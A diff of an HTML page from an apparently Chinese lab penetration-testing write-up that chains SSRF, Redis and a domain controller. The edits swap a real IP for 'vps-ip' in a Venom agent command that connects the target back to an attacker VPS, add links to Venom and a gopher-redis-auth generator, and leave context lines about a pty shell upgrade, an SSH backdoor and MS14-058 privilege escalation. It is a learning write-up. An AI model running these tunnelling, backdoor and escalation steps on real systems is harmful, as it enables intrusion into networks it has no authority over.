@@ -126,7 +126,7 @@ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 </ul>
 <pre><code class="language-bash"># 目标机执行：
 
-./agent_linux_x64 -rhost 101.200.150.149 -rport 9999
+./agent_linux_x64 -rhost vps-ip -rport 9999
 </code></pre>
 <figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200716182256.png" alt="image-20200716182256213" loading="lazy"></figure>
 <ul>
@@ -155,7 +155,7 @@ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 <li>
 <p>等主机上线后我们就可以把代理关闭了，以后在启动代理通过<code>CS</code>启动就可以，给Linux主机种一个<code>SSH</code>后门，隐藏一个文件，作为启动文件，开始进行横向渗透：</p>
 <ul>
-<li>通过MS14-058提权，获得管理员权限：</li>
+<li>通过<code>MS14-058</code>提权，获得管理员权限：</li>
 </ul>
 <figure data-type="image" tabindex="14"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200716210431.png" alt="image-20200716210430982" loading="lazy"></figure>
 </li>
@@ -172,7 +172,7 @@ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 <figure data-type="image" tabindex="16"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200716210801.png" alt="image-20200716210801220" loading="lazy"></figure>
 </li>
 <li>
-<p>Ping一下，得到域控IP： <strong>192.168.138.138</strong>，Arp-a 查看一下外连的IP：</p>
+<p>Ping一下，得到域控IP： <strong>192.168.138.138</strong>，<code>Arp-a</code>查看所有ARP缓存表中的所有信息：</p>
 </li>
 </ul>
 <figure data-type="image" tabindex="17"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200716210900.png" alt="image-20200716210900907" loading="lazy"></figure>
@@ -205,8 +205,13 @@ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 <ol>
 <li>相对理想化的一次渗透过程，真实环境中，工具免杀以及权限维持都会花费大量时间</li>
 <li>SSRF--&gt;Redis--&gt;DC 全过程的起点都是小小的一个SSRF，可见危害是及其严重的</li>
-<li>继续努力，早日脱**”菜“**</li>
+<li>继续努力，早日脱<strong>菜</strong></li>
 </ol>
+<h2 id="0x05-所用到的工具">0x05 所用到的工具：</h2>
+<p>https://github.com/Dliv3/Venom<br>
+<strong>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</strong></p>
+<p>https://github.com/LS95/gopher-redis-auth<br>
+<strong>gopher-redis-auth</strong>生成工具</p>
 
         </div>
         <!-- Share to Twitter, Weibo, Telegram -->
@@ -254,6 +259,7 @@ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 <li><a href="#0x02-%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E5%BB%BA%E7%AB%8B">0x02 内网隧道建立：</a></li>
 <li><a href="#0x03-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F">0x03 横向渗透</a></li>
 <li><a href="#0x04-%E6%80%BB%E7%BB%93">0x04 总结</a></li>
+<li><a href="#0x05-%E6%89%80%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7">0x05 所用到的工具：</a></li>
 </ul>
 </li>
 </ul>
